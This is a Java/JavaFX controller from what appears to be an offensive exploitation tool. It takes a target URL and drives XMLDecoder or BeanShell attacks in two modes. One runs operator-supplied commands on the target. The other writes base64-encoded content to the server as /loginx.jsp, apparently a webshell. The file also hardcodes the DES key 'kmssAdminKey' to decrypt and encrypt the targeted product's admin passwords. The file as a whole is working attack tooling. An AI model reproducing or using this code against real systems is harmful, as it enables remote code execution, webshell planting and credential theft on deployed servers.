package sample.Controller;



import java.lang.String;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ResourceBundle;

import javafx.beans.value.ChangeListener;
import javafx.beans.value.ObservableValue;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.scene.control.*;
import javafx.scene.layout.AnchorPane;
import sample.util.DESEncrypt;
import sample.util.HttpUtils;
import sample.util.ToolUtils;

public class ExploitController {
    HttpUtils http=new HttpUtils();
    @FXML // ResourceBundle that was given to the FXMLLoader
    private ResourceBundle resources;

    @FXML // URL location of the FXML file that was given to the FXMLLoader
    private URL location;

    @FXML // fx:id="file_content"
    private TextArea file_content; // Value injected by FXMLLoader

    @FXML // fx:id="Account"
    private TextField Account; // Value injected by FXMLLoader

    @FXML // fx:id="Anc2"
    private AnchorPane Anc2; // Value injected by FXMLLoader

    @FXML // fx:id="schaltung2"
    private ComboBox<?> schaltung2; // Value injected by FXMLLoader

    @FXML // fx:id="reihe"
    private String reihe; // Value injected by FXMLLoader

    @FXML // fx:id="textbox1"
    private TextField textbox1; // Value injected by FXMLLoader

    @FXML // fx:id="DateTime1"
    private TextField DateTime1; // Value injected by FXMLLoader

    @FXML // fx:id="token_key"
    private TextField token_key; // Value injected by FXMLLoader

    @FXML // fx:id="EncodeText1"
    private TextField EncodeText1; // Value injected by FXMLLoader

    @FXML // fx:id="EncodeText2"
    private TextField EncodeText2; // Value injected by FXMLLoader

    @FXML // fx:id="command"
    private TextField command; // Value injected by FXMLLoader

    @FXML // fx:id="DecodeButton"
    private Button DecodeButton; // Value injected by FXMLLoader

    @FXML // fx:id="button"
    private Button button; // Value injected by FXMLLoader

    @FXML // fx:id="result"
    private TextArea result; // Value injected by FXMLLoader

    @FXML // fx:id="rawText"
    private TextField rawText; // Value injected by FXMLLoader

    @FXML // fx:id="schaltung"
    private ComboBox<?> schaltung; // Value injected by FXMLLoader

    @FXML // fx:id="parallel"
    private String parallel; // Value injected by FXMLLoader

    @FXML // fx:id="EncodeText"
    private TextField EncodeText; // Value injected by FXMLLoader

    @FXML // fx:id="EncodeButton1"
    private Button EncodeButton1; // Value injected by FXMLLoader

    @FXML // fx:id="reihe2"
    private String reihe2; // Value injected by FXMLLoader

    @FXML // fx:id="domain"
    private TextField domain; // Value injected by FXMLLoader

    @FXML // fx:id="parallel2"
    private String parallel2; // Value injected by FXMLLoader

    @FXML // fx:id="TokenName"
    private TextField TokenName; // Value injected by FXMLLoader

    @FXML // fx:id="token_Result"
    private TextField token_Result; // Value injected by FXMLLoader

    @FXML // This method is called by the FXMLLoader when initialization is complete
    void initialize() {
        schaltung2.getSelectionModel().selectedItemProperty().addListener(new ChangeListener() {
            //tree.getSelectionModel().selectedIndexProperty().addListener(new ChangeListener() {
            @Override
            public void changed(ObservableValue observable,Object oldValue, Object newValue) {
                System.out.println(schaltung2.getValue().toString());
                if (schaltung2.getValue().toString().contains("命令执行")){
                    file_content.setDisable(true);
                    command.setDisable(false);
                    return;

                }
                else {
                    file_content.setDisable(false);
                    command.setDisable(true);
                }

            }
        });
        assert button != null : "fx:id=\"button\" was not injected: check your FXML file '12.fxml'.";
        assert result != null : "fx:id=\"result\" was not injected: check your FXML file '12.fxml'.";
        assert file_content != null : "fx:id=\"file_content\" was not injected: check your FXML file '12.fxml'.";
        assert schaltung != null : "fx:id=\"schaltung\" was not injected: check your FXML file '12.fxml'.";
        assert parallel != null : "fx:id=\"parallel\" was not injected: check your FXML file '12.fxml'.";
        assert schaltung2 != null : "fx:id=\"schaltung2\" was not injected: check your FXML file '12.fxml'.";
        assert reihe != null : "fx:id=\"reihe\" was not injected: check your FXML file '12.fxml'.";
        assert reihe2 != null : "fx:id=\"reihe2\" was not injected: check your FXML file '12.fxml'.";
        assert textbox1 != null : "fx:id=\"textbox1\" was not injected: check your FXML file '12.fxml'.";
        assert parallel2 != null : "fx:id=\"parallel2\" was not injected: check your FXML file '12.fxml'.";
        assert command != null : "fx:id=\"command\" was not injected: check your FXML file '12.fxml'.";

    }



    public void onButtonAction(ActionEvent actionEvent) {

        if (ToolUtils.NotNull((String) schaltung2.getValue()) && ToolUtils.NotNull((String) schaltung.getValue().toString()) && ToolUtils.NotNull(textbox1.getText())){
            String url=textbox1.getText();
            if (schaltung.getValue().toString().contains("XMLDecoder")){
                if (schaltung2.getValue().toString().contains("命令执行")){
                    //XMLdecoder 命令执行
                    String cmd=command.getText().toString();
                    //String bsbae=new sun.misc.BASE64Encoder().encodeBuffer(content.getBytes(StandardCharsets.UTF_8));
                    String ok_result=http.XML_execCmd(url,cmd);
                    if (ok_result.toString().contains("Execute")){
                        result.setText(ok_result.trim().replace("    ","\n "));
                        return;

                    }
                    result.setText("\nResult:\nError!+\n"+ok_result.replace(" ","\n"));
                    return;
                }else {
                    //XMLdecoder 文件写入
                    String content=file_content.getText().trim();
                    String bsbae=new sun.misc.BASE64Encoder().encodeBuffer(content.getBytes()).trim();//base64编码后的文件内容
                    String ok_result=http.XML_WriteFile(url,bsbae.replace("\r\n",""));
                    result.setText("\n请手动访问:"+url+"/loginx.jsp");
                    return;
                }
            }
            else{
                if (schaltung2.getValue().toString().contains("命令执行")){
                    //BeanShell 命令执行
                    //BeanShell 文件写入
                    String cmd=command.getText().toString();
                    //String bsbae=new sun.misc.BASE64Encoder().encodeBuffer(content.getBytes(StandardCharsets.UTF_8));
                    String ok_result=http.Bsh_execCmd(url,cmd);
                    if (ok_result.toString().contains("Execute")){

                        int num=ok_result.toString().indexOf("<dataList>");
                        String res=ok_result.toString().substring(0,num);
                        result.setText(res.trim().replace("    ","\n "));
                        return;
                    }
                    else {
                        result.setText("\nResult:\nError!+\n"+ok_result.replace(" ","\n"));
                        return;
                    }
                }else {
                    //BeanShell 文件写入
                    String content=file_content.getText();
                    String bsbae=new sun.misc.BASE64Encoder().encodeBuffer(content.getBytes(StandardCharsets.UTF_8));
                    String ok_result=http.Bsh_WriteFile(url,bsbae.replace("\r\n",""));
                    if (ok_result.length()==119 || ok_result.toString().contains("公式运行时返回了空值")){
                        result.setText("\n写入成功:"+url+"/loginx.jsp");
                        return;
                    }
                    else {

                        result.setText("\nResult:\nError!+\n"+ok_result.replace(" ","\n"));
                        return;
                    }

                }

            }
        }
        Alert alert = new Alert(Alert.AlertType.INFORMATION);
        alert.titleProperty().set("提示");
        alert.headerTextProperty().set("参数不可为空");
        alert.showAndWait();

    }

    public void  DecodeButton(ActionEvent actionEvent) {
        String text=EncodeText.getText().toString().trim();
        String raw_text=doPasswordDecrypt(text);
        rawText.setText(raw_text);
        return ;
    }
    public static String doPasswordDecrypt(String password) {
        String resulut=null;
        try {
            DESEncrypt des = new DESEncrypt("kmssAdminKey");
            return des.decryptString(password);
        } catch (Exception ex) {
            try {
                DESEncrypt des = new DESEncrypt("kmssAdminKey");
                return des.decryptString(password);
            } catch (Exception e) {
                resulut="解密失败";
                return resulut;
            }
        }
    }

    public void EnecodeButton(ActionEvent actionEvent) {
        String password=EncodeText1.getText();
        String result=doPasswordEncrypt(password);
        EncodeText2.setText(result.toString().trim());
    }
    public static String doPasswordEncrypt(String password) {
        String resulut=null;
        try {
            DESEncrypt des = new DESEncrypt("kmssAdminKey");
            return des.encryptString(password);
        } catch (Exception ex) {
            try {
                    DESEncrypt des = new DESEncrypt("kmssAdminKey");
                return des.encryptString(password);
            } catch (Exception e) {
                resulut="加密失败";
                return resulut;
            }
        }
    }

}
